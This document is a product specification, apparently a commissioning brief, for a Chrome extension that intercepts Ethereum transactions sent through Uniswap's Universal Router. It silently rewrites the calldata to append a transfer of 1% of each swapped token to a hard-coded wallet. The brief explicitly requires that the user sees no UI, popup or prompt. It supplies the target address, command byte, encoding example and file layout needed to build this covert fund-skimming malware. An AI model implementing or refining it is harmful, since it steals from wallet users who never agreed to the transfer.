📄 Product Description Document
Project Name: Uniswap 1% Fee Injection Browser Extension
Client: [Your Name]
Date: July 2025

1. 🔍 Overview
   This project is a browser extension (Chrome-compatible, Manifest V3) that intercepts and modifies Ethereum transaction flows initiated via Uniswap v4’s Universal Router frontend.

It automatically adds a fee step (1%) into the execute(bytes commands, bytes[] inputs) function call by appending a TRANSFER command that sends 1% of the swap token to a specific wallet.

2. 🧩 Technical Objective
   🧱 Target System:
   Uniswap v4 Universal Router (verified address):

0xaefb1cc5be3cd7cd6e67c76a6d78b44ae8cc8ee3
ABI function signature being intercepted:

solidity
function execute(bytes commands, bytes[] inputs)
🧠 Goal:
If a transaction to the above address calls execute(...), intercept and insert an additional command:

TRANSFER(address token, address recipient, uint160 amount)

Fee amount: 1% of token being swapped

Recipient:

0x237D4cfE852DB65d6b170f4F9BDcB09acA2375Ed 3. 📦 Extension Behavior
🧠 Hook:
Intercepts window.ethereum.request(...) inside the browser.

Hooks into:

js
window.ethereum.request({ method: "eth_sendTransaction", params: [...] })
🎯 Logic Flow:
Detect if the call is to the Universal Router address

Parse tx.data

Decode execute(bytes, bytes[])

Extract existing commands and inputs

Analyze inputs to:

Find token being swapped (inputs[i])

Estimate 1% fee value

Append a TRANSFER command

Format:

solidity
TRANSFER(token: address, recipient: address, amount: uint160)
Appended to the commands array

New input added at the same index in inputs[]

Re-encode the execute(...) payload

Replace the original tx.data with the modified payload

Pass it back to ethereum.request

4. 🛠 Example
   Intercepted Original Call:
   js
   to: "0xaefb1cc5be3cd7cd6e67c76a6d78b44ae8cc8ee3"
   value: "0.001 ETH"
   data: "0x24856bc3..." // execute(bytes, bytes[])
   Parsed commands[]:

hex
1006060400...
inputs[] included a V4_SWAP_EXACT_IN command for USDT.

Modified Version:
Append command byte: 0x0a (TRANSFER)

Append to inputs[]:

js
abi.encode(
token, // e.g., USDT: 0xdac17f958d2ee523a2206206994597c13d831ec7
0x237D4cfE852DB65d6b170f4F9BDcB09acA2375Ed, // Fee wallet
amount / 100 // 1% fee
) 5. 🖥️ UI & UX Requirements
No UI is required.

No popup or interaction with the user.

No options or configuration panel.

6. ⚙️ Developer Requirements
   Language: JavaScript (ES6+), ethers.js for ABI parsing

Framework: Chrome extension (Manifest V3)

Deployment: ZIP or GitHub repository

Security Notes:

Limit to dApps hosted on: https://app.uniswap.org/*

Avoid affecting other contract calls

7. 📁 File Breakdown
   bash
   /extension/
   ├── manifest.json
   ├── injector.js # logic to hook ethereum.request
   ├── decode.js # ABI decode/encode helpers
   ├── utils.js # math helpers for 1% calc
8. 📌 Notes
   Support ERC-20 swaps, as well as ETH -> ERC20 swaps.

Optional enhancement: log every injection with console.log.

Must not break normal transaction behavior if the payload is not execute(...).

9. ✅ Acceptance Criteria
   Extension successfully injects a 1% fee for Uniswap v4 swaps

Fee is visible as a TRANSFER command to 0x237D4cfE852DB65d6b170f4F9BDcB09acA2375Ed

Does not interfere with non-Uniswap interactions

Handles multiple commands without corrupting calldata
